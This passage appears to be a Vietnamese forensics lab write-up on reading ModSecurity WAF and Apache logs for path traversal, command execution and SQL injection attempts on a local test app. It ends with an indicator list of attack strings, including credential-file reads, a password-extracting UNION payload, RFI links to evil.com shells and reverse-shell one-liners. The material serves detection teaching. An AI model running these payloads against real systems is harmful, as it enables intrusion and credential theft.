Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/view.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuewAAAAU"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691830023818 3131 (- - -)
Stopwatch2: 1767691830023818 3131; combined=1396, p1=281, p2=874, p3=23, p4=121, p5=97, sr=56, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--49e1f51a-Z--
```
- Có thể thấy rằng, phần output hiển thị chi tiết audit của access logs chứa request cũng như response body, có thể là bất kỳ hoạt động độc hại nào.
- Ta thấy rằng có đoạn message hiển thị cảnh báo của một pattern khớp với Path Traversal. Nó làm rõ rằng một malicious string khớp với mẫu được tìm thấy trong `REQUEST_URI_RAW` và nó là một vấn đề quan trọng.
- Thêm vào đó, các lỗi của `Apache-Error` được hiển thị, một số cái là cảnh báo khác của tấn công Path Traversal, nhưng tại thời điểm này một pattern khác đã khớp. `Apache-Error` khác là cảnh báo của một điểm đầu vào bất thường vượt quá ngưỡng đã đặt. Tổng điểm đầu vào, loại tấn công và điểm paranoia level đã được ghi lại, cung cấp cái nhìn về mức độ tấn công.
> Để hiểu ý nghĩa của log data trong một cuộc điều tra forensics, việc lọc các thông chi tiết không liên quan và chỉ giữ lại phần dữ liệu quan trọng rất quan trọng.

#### b) Remote Command Execution (RCE):
- Trong một cuộc tấn công RCE, một attacker có thể thực thi mã độc trên server tương tự như việc thực thi commands trong terminal. Dưới tình huống nào đó, nó có thể được nhắc tới như một lỗ hổng Command Injection.
- Ví dụ, nếu một websites cho phép users enter một command để tìm kiếm file, một attacker có thể enter một command đẻ xoá tất cả files trên server bằng cách thêm vào commands như `; rm -rf /` vào input field. Điều này có thể thương lượng với toàn bộ hệ thống nếu website có được sự cho phép cần thiết để thực thi các lệnh này.
> Thuật ngữ RCE có thể thay thế giữa Remote Command Execution và Remote Code Execution, nhưng cả hai đều nhắc tới một lỗ hổng cho phép một attacker thực thi code và/hoặc commands remotely.
- Đi đến http://127.0.0.1:9090/command.php để thử nghiệm. Web app cho phép ta enter commands, thực thi chúng và quay lại output. Trong trường hợp không có security checks thích hợp, việc này có thể được exploited để thương lượng và tẩy đi toàn bộ hệ thống.
- Để tạo logs trên server, thực thi các commands sau theo thứ tự trên http://127.0.0.1:9090/command.php:
    - `id`
    - `cat /etc/passwd`
    - `cat /etc/shadow`
- Kiểm tra `access.log`:
![image](https://hackmd.io/_uploads/S11RY9sEbg.png)
Có thể thấy rằng, logs chỉ show duy nhất requests và không tiết lộ commands được input bởi user vì đó là requests GET và POST. Đây là nơi WAF thực hiện hai vai trò là request và response body. Vì vậy, để xem commands nào được input bởi user vào làm cách nào web app respond, ta xem xét WAF logs.
- Xem logs của requests nơi command `id` được entered, ta có thể thấy rằng hầu như không có cảnh báo vì command này quá ngắn để khớp với bất kỳ patterns nào. Tuy nhiên, với command `cat etc/passwd`, nó dò ra LFI (Local File Inclusion) và RCE (Remote Command Execution):
``` ubuntu
<SNIP>

Message: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat /etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat/etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat /etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]
Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:cmd: cat/etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "91"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 13 - SQLI=0,XSS=0,RFI=0,LFI=5,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 13, 0, 0, 0"] [ver "OWASP_CRS/3.3.2"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT-PsFa_lKkx8ckcXpMAAAAAQ"]

<SNIP>
```
- Tương tự, với command `cat /etc/shadow`, có thể thấy rằng server không respond với nội dung của file vì server đang chạy như một user không có quyền `www-data` và không có truy cập cần thiết để đọc file `/etc/shadow`. Có thể confirm bởi:
![image](https://hackmd.io/_uploads/rk__mioEZl.png)
- Tuy nhiên, server vẫn phát hiện ra nỗ lực của LFI và RCE:
``` ubuntu
<SNIP>

Message: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat /etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat/etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]

<SNIP> 

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "97"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat /etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/shadow" at ARGS:cmd. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "500"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/shadow found within ARGS:cmd: cat/etc/shadow"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"]

<SNIP>

Apache-Error: [file "apache2_util.c"] [line 271] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "91"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 13 - SQLI=0,XSS=0,RFI=0,LFI=5,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 13, 0, 0, 0"] [ver "OWASP_CRS/3.3.2"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/command.php"] [unique_id "Y-rT_V10ftOo0AKdI-JC2gAAAAU"

<SNIP>
```
> File `error.log` có thể chứa thông tin được thêm vào về malicious requests xử lý bởi server.

#### c) SQL Injection (SQLi):
- Trong một tấn công SQLi, attackers thao tác với website's input fields để submit malicious SQL code sắp thêm vào server.
- Ví dụ, xem xét một website với trang login gồm username và password. Thông thường, website sẽ so sánh thông tin đăng nhập với thông tin được lưu trong database để xác định nếu user nên được cấp quyền truy cập. Nếu website's code có khả năng có lỗ hổng SQLi, attacker sẽ enter `' OR 1=1--` hay `UNION SELECT` vào username, về cơ bản điều này sẽ đánh lừa database trả về tất cả bản ghi, bỏ qua bước kiểm tra xác thực.
- Đi tới http://127.0.0.1:9090/users.php để thử nghiệm và nó sẽ hiển thị một danh sách users với một input field để ta có thể research user bằng usernames của họ.
- Để bắt đầu attack và tạo logs trên server, enter các payloads sau theo thứ tự:
    - `user1' and 1=1 #`
    ![image](https://hackmd.io/_uploads/H1WZjsi4Wl.png)
    - `user1' union select username, email, password from users #`
    ![image](https://hackmd.io/_uploads/SkTQqsoEWe.png)

    Chúng ta dùng payload đầu tiên để check rằng nếu web app dính lỗ hổng SQLi và payload thứ hai để xuất user's passwords từ database.

- Cả hai đều là POST requests, có thể check logs trong file `error.log`:
![image](https://hackmd.io/_uploads/HJGq9oiVbx.png)
- Có thể thấy rằng, chạy lệnh `cat` với `grep` cho ta thấy trực tiếp hai sự cố SQLi được tdò ra bởi WAF. Chi tiết audit logs có thể xem trong file `modsec_audit.log`.
> Thông thường `modsec_audit.log` sẽ có thể ghi request, response body và payload.

## III. Một số dấu hiệu của attack:
> Chuỗi tấn công thường gặp: Scan $\rightarrow$ Path Traversal $\rightarrow$ LFI $\rightarrow$ RCE $\rightarrow$ Webshell/Reverse Shell

### 1. SQL Injection (SQLi):
- Attacker chèn câu lệnh SQL vào input thường để bypass login, trích xuất dữ liệu, sửa hay xoá database.
- Dấu hiệu:
    - `' OR 1=1 --`
    - `" OR "1"="1`
    - `UNION SELECT`
    - `SELECT * FROM`
    - `information_schema`
    - `sleep(5)`
    - `benchmark(`
    - `%27` (encode của `'`)
- Log thường thấy: `access.log`, `database error log`

### 2. Local File Inclusion (LFI):
- Ứng dụng cho phép include file local trên server để đọc file nhạy cảm.
- Dấu hiệu:
    - `../`
    - `/etc/passwd`
    - `/etc/shadow`
    - `/proc/self/environ`
    - `file=../../etc/passwd`
    - Encode:
        - `%2e%2e%2f`
        - `%252e%252e%252f`
- Log thường thấy: `access.log`, `modsec_audit.log`, `error.log`

### 3. Remote File Inclusion (RFI):
- Ứng dụng include file từ server bên ngoài, thường để chạy webshell, có thể dẫn trực tiếp đến RCE.
- Dấu hiệu:
    - `http://evil.com/shell.txt`
    - `https://attacker/shell.php`
    - `file=http://`
    - `include=http://`
    - `allow_url_include`

### 4. Path Traversal:
- Thoát khỏi thư mục hiện tại để truy cập file ngoài phạm vi cho phép. Path Traversal là kỹ thuật, còn LFI là hậu quả.
- Dấu hiệu:
    - `../`
    - `..\\`
    - `/..;/`
    - `..%2f`
    - `..%5c`
    - `/var/www/../../etc/passwd`

### 5. Command Injection:
- Chèn lệnh hệ điều hành vào input (thường trong PHP, bash wrapper).
    - `; ls`
    - `; id`
    - `&& whoami`
    - `|| uname -a`
    - `| cat /etc/passwd`
    - ``id``
    - `$(id)`
- Log thường thấy: `access.log`, `modsec_audit.log`

### 6. Remote Code Execution (RCE):
- Kẻ tấn công thực thi mã lệnh tùy ý trên server.
- Dấu hiệu:
    - `id`
    - `whoami`
    - `uname -a`
    - `pwd`
    - `bash -i`
    - `/bin/bash`
    - `/bin/sh`
- Reverse Shell:
    - `bash -i >& /dev/tcp/IP/PORT 0>&1`
    - `nc -e /bin/sh`
    - `nc IP PORT`
    - `python -c 'import os; os.system(...)'`
- Obfuscation:
    - `%3B (;)`
    - `%26%26 (&&)`
    - `%7C%7C (||)`
    - Base64: `echo aWQ= | base64 -d | sh`
- Log thường thấy: `modsec_audit.log`, `error.log`

### 7. Scan/Reconnaissance:
- Giai đoạn do thám trước khi tấn công.
- Đặc điểm:
    - Nhiều request trong thời gian ngắn.
    - `404` liên tục.
    - Thay đổi User-Agent.
- Dấu hiệu:
    - `/phpmyadmin`
    - `/wp-admin`
    - `/admin`
    - `/login`
    - `/test`
    - `/backup`
    - `/config`
    - `/old`
    - `/.git/`
    - `/.env`
